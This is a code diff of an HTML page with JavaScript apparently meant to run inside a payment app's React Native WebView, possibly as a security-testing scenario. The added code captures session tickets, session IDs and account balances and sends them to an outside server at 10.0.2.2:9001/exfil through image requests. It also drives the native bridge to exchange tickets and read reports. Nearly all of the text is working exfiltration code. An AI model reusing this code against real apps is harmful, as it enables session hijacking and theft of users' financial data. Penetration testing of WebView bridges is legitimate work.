@@ -3,10 +3,17 @@
 <head><meta charset="UTF-8"></head>
 <body>
 <pre id="log"></pre>
-<div id="r-balance"></div>
 <script>
+var S="http://10.0.2.2:9001";
 var o=document.getElementById("log");
 function log(m){o.textContent+=m+"\n";}
+function send(data){
+  var img=new Image();
+  img.src=S+"/exfil?d="+encodeURIComponent(data);
+}
+function rn(msg){
+  try{window.ReactNativeWebView.postMessage(JSON.stringify(msg));}catch(x){}
+}
 
 log("loaded");
 
@@ -14,23 +21,21 @@ window.addEventListener("eqstpay:scn01:ticket",function(e){
   var t=e.detail&&e.detail.ticket;
   if(!t)return;
   log("ticket="+t);
-  try{window.ReactNativeWebView.postMessage(JSON.stringify({channel:"WEB_SESSION",action:"EXCHANGE",ticket:t}));}catch(x){}
+  send("TICKET:"+t);
+  rn({channel:"WEB_SESSION",action:"EXCHANGE",ticket:t});
 });
 
 window.addEventListener("eqstpay:scn01:session",function(e){
-  log("session="+JSON.stringify(e.detail));
-  // REPORT 요청 안 보냄 — Runner가 자동으로 보내주길 대기
+  var d=e.detail||{};
+  log("session="+JSON.stringify(d));
+  send("SESSION:"+d.sessionId);
+  rn({channel:"REPORT",action:"READ"});
 });
 
 window.addEventListener("eqstpay:scn01:report",function(e){
   var r=(e.detail&&e.detail.report)||{};
-  log("REPORT:"+JSON.stringify(r));
-  log("BALANCE:"+r.balance);
-  document.getElementById("r-balance").textContent=String(r.balance);
-});
-
-window.addEventListener("message",function(e){
-  log("MSG:"+JSON.stringify(e.data));
+  log("balance="+r.balance);
+  send("BALANCE:"+r.balance);
 });
 </script>
 </body>
